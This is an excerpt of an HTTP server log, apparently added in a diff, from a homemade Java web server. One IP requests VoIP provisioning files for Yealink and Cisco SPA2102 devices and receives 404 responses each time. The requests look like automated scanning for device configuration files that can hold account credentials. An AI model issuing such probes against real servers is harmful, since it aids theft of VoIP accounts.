+[2019-12-05 22:13:54] [77.247.109.70 / Conn #48] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 404 Not Found", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 22:13:54 CET 2019", "Content-type": "text/html", "Content-length": "533", "Connection": "close"}
+[2019-12-05 22:13:54] [77.247.109.70 / Conn #48] [HTTP-RESPONSE] [BODY] File{"name": "404.html", "length": 533}
+[2019-12-05 22:13:54] [77.247.109.70 / Conn #48] Connection terminated
+[2019-12-05 22:15:38] [77.247.109.70 / Conn #49] [HTTP-REQUEST] {"GET": "/y000000000031.cfg", "User-Agent": "Yealink W52P 25.80.0.10", "Host": "176.23.117.213", "Connection": "Keep-Alive"}
+[2019-12-05 22:15:38] [77.247.109.70 / Conn #49] [INFO] /y000000000031.cfg doesn't exist, returning 404 page.
+[2019-12-05 22:15:38] [77.247.109.70 / Conn #49] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 404 Not Found", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 22:15:38 CET 2019", "Content-type": "text/html", "Content-length": "533", "Connection": "close"}
+[2019-12-05 22:15:38] [77.247.109.70 / Conn #49] [HTTP-RESPONSE] [BODY] File{"name": "404.html", "length": 533}
+[2019-12-05 22:15:39] [77.247.109.70 / Conn #49] [ERROR] java.net.SocketException: Connection reset
+[2019-12-05 22:15:39] [77.247.109.70 / Conn #49] Connection terminated
+[2019-12-05 23:31:33] [77.247.109.70 / Conn #50] [HTTP-REQUEST] {"GET": "/spa2102.cfg", "Host": "176.23.117.213", "Connection": "Keep-Alive"}
+[2019-12-05 23:31:33] [77.247.109.70 / Conn #50] [INFO] /spa2102.cfg doesn't exist, returning 404 page.
+[2019-12-05 23:31:33] [77.247.109.70 / Conn #50] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 404 Not Found", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 23:31:33 CET 2019", "Content-type": "text/html", "Content-length": "533", "Connection": "close"}
+[2019-12-05 23:31:33] [77.247.109.70 / Conn #50] [HTTP-RESPONSE] [BODY] File{"name": "404.html", "length": 533}
+[2019-12-05 23:31:33] [77.247.109.70 / Conn #50] Connection terminated
